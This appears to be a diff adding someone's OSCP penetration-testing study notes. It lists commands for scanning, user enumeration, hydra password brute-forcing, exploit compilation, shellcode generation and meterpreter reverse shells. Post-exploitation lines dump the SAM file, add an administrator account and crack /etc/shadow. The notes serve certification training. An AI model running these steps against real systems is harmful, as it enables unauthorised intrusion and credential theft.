@@ -1,0 +1,355 @@
+OSCP Notes
+Use Leo and make a new child entry for each IP. Keep ALL information related to testing of that machine in that child entry. Create child entries within the IP entry for each type of scan/information gathering. Create a totally separate child entry for username/password combinations, general notes etc. Leo/good record keeping is what will win the game.
+
+
+
+Scan network for live hosts
+
+(nmap/zenmap)
+
+For NMAP –
+
+
+nmap -vv -sP 192.168.0.1-254 -oG hosts_up.txt
+
+cat hosts_up.txt | grep -i “up”
+
+
+
+
+nmap -PN 192.168.9.200-254
+
+(this will also show open ports for each host)
+
+
+
+
+Identify OS
+
+(nmap/zenmap)
+
+For NMAP –
+
+
+nmap -O 192.168.0.100 (just OS fingerprint)
+
+
+nmap -A 192.168.9.201 (runs an “aggressive” scan – scan,OS fingerprint, version scan, scripts and traeroute)
+
+
+
+
+Check hosts for services
+
+(nmap/zenmap)
+
+For NMAP
+
+- nmap -sS 192.168.9.254 (TCP)
+
+- nmap -sU 192.168.9.254 (UDP)
+
+(Could be better to do this in zenmap and group servers by services)
+
+
+FOR SNMP
+
+-  snmpwalk -c public -v1 192.168.9.254 1 |grep hrSWRunName|cut -d” ” -f
+
+
+For a known port
+
+- nmap – p 139 192.168.9.254
+
+
+
+DNS Lookups/Hostnames
+
+
+host -l <domain> <dns server>
+
+e.g. host -l acme.local 192.168.0.220
+
+
+
+
+Banner grab/Version services
+
+(nmap/zenmap/SNMP)
+
+Check versions of software/services against milw0rm and security focus)
+
+
+For NMAP
+
+- nmap -sV 192.168.9.254
+
+
+
+For SNMP
+
+snmpenum -t 192.168.0.100 (displays all snmp informations for that server)
+
+
+
+For SMTP
+
+nc -v <mailserver> 25
+
+- Will give mailserver version. Can also VRFY to find valid usernames/email accounts
+
+
+
+Netbios/SMB
+
+- smb4k (graphical interface – lists shares)
+
+
+- smbserverscan
+
+
+- metasploit auxiliary scanner
+
+./msfconsole
+
+show
+
+use scanner/smb/version
+
+set RHOSTS 192.168.0.1-192.168.0.254
+
+run
+
+
+
+
+Enumerate Usernames
+
+(SNMP/SMTP/SMB[NETBIOS]/Add others here)
+
+
+For SMB
+
+- nmap -sT -p 445 192.168.9.200-254 -oG smb_results.txt (then grep open sessions)
+
+(on my machine /root/offsec) ./samrdump.py 192.168.9.201 (results from above)
+
+
+For SNMP
+
+- nmap -sT -p 161 192.168.9.200/254 -oG snmp_results.txt (then grep)
+
+- snmpwalk public -v1 192.168.9.201 1 |grep 77.1.2.25 |cut -d” “ -f4
+
+
+For SMTP – (/pentest/enumeration/vrfy)
+
+- ./smtp_VRFY.py <mailserver IP>
+
+** NEED TO MAKE THREADED – VERY SLOW **
+
+
+SAMRDUMP.PY – (/pentest/python/impacket-examples/samrdump.py)
+
+- ./samrdump.py SNMP server
+
+
+*** NAMES.TXT – /pentest/enumeration/vrfy/names.txt ***
+
+*** OR /pentest/web/wfuzz/wordlists/others/names.txt ***
+
+
+
+
+
+Crack Passwords
+
+(hydra/THC bruter)
+
+(need mil-dict.txt from Milw0rm – cracked hashs)
+
+
+FTP – hydra -l <username> -P mil-dic.txt -f <FTP SERVER> ftp -V
+
+
+POP3 – hydra -l <username> -P mil-dict.txt -f <MAIL SERVER> pop3 -V (may need to use -t 15 to limit concurrent connections)
+
+
+SNMP – hydra -P mil-dict.txt -f <SNMP SERVER> -V
+
+
+MS VPN – dos2unix words (whatever word list)
+
+cat words | thc-pptp-bruter VPN server
+
+
+
+Look for known vulnerable services
+
+(refer nmap/zenmap output)
+
+Check versions of software (by either snmp enumeration or nmap/zenmap) against http://www.milw0rm.com/search.php or http://www.securityfocus.com/vulnerabilities or http://www.exploit-db.com
+
+
+
+
+Compile exploit code if possible
+
+(milw0rm archive)
+
+
+cd /pentest/exploits/milw0rm
+
+cat sploitlist.txt | grep -i [exploit]
+
+
+Some exploits may be written for compilation under Windows, while others for Linux.
+
+You can identify the environment by inspecting the headers.
+
+cat exploit | grep “#include”
+
+
+Windows:  process.h, string.h, winbase.h, windows.h, winsock2.h
+
+Linux:   arpa/inet.h, fcntl.h, netdb.h, netinet/in.h, sys/sockt.h, sys/types.h, unistd.h
+
+
+Grep out Windows headers, to leave only Linux based exploits:
+
+cat sploitlist.txt | grep -i exploit | cut -d ” ” -f1 | xargs grep sys | cut -d “:” -f1 | sort -u
+
+
+LINUX
+
+gcc -o dcom 66.c
+
+./dcom
+
+
+
+WINDOWS
+cd /root/.wine/drive_c/MinGW/bin
+wine gcc -o ability.exe ability.c -lwsock32
+wine ability.exe (to run compiled file)
+
+
+
+
+Wireshark Filters
+
+
+To filter out all traffic for IP 192.168.0.100
+
+!(IP.ADDR == 192.168.0.100)
+
+
+
+
+FUZZING STEPS – ASH STYLE
+
+    Determine target application and operating system
+    Obtain a copy of the application
+    Analyse the RFC & communication protocols
+    Discover & record crash conditions
+    Analyse crash conditions for exploitation opportunities
+
+Things we need to know
+
+    Which 4 bytes overwrite EIP
+    Do we have enough space in buffer for shellcode
+    Is this shellcode easily  accessible in memory
+    Does the application filter out any characters
+    Will we encounter overflow protection mechanisms
+
+
+(*** HANDY – framework3/tools -> nasm_shell.rb => JMP ESP ***)
+
+Creating pattern for EIP location
+- framework3/tools -> pattern_create.rb <length> >> Fuzzing_script (will append to the end of the script)
+– then look in ollydbg for pattern (need to reverse it and convert)
+
+- pattern_offset.rb <EIP PATTERN>
+– will show byte offset
+
+Creating shellcode
+(in framework3)
+./msfpayload |grep -i shell
+
+./msfpayload …… o (for options)
+./msfpayload …… c (to create)
+** TAKE NOTE OF SHELLCODE SIZE AND ADJUST FINAL BUFFER TO SUIT **
+
+CAN ALSO USE FRAMEWORK2 MSFWEB INTERFACE (super easy)
+
+
+Finding an exploit
+/pentest/exploits/milw0rm
+grep <exploit> sploitlist.txt
+
+
+MSFCLI (p243)
+./msfcli
+-o options
+-p payloads
+-t test
+-e exploit
+
+MSFCONSOLE
+sessions -l => list created sessions
+sessions -i # => interact with specific session number
+
+show options
+
+search <string>
+
+use exploit/ …..
+set PAYLOAD ….
+
+exploit
+
+
+Meterpreter Payloads (p260)
+payload = windows/meterpreter/reverse_tcp ….
+
+meterpreter> help (lists all commands)
+
+upload <file> c:\\windows
+
+download c:\\windows\\repair\\sam /tmp
+
+ps (running tasks)
+
+execute -f cmd -c (creates a new channel with the cmd shell)
+interact # (interacts with channel)
+
+
+Other useful windows commands
+net user ash my_password /add
+net localgroup administrators ash /add
+
+
+Passwords & Hashes
+Windows SAM => %systemroot%\Repair
+(pwdump or fgdump – p340)
+
+or use framework meterpreter shell => gethashes
+
+Linux => /etc/passwd & /etc/shadow
+
+
+John The Ripper
+for linux => unshadow passwd & shadow file to another file
+
+./john hashes.txt
+
+
+
+Associated Documents
+
+Common Ports – packetlife.net/media/library/23/common-ports.pdf
+Wireshark – http://packetlife.net/media/library/13/Wireshark_Display_Filters.pdf
+TCPDUMP – http://packetlife.net/media/library/12/tcpdump.pdf
+SANS NETCAT – http://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf
+SANS MISC TOOLS – http://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf
+SANS 504 – Cant find
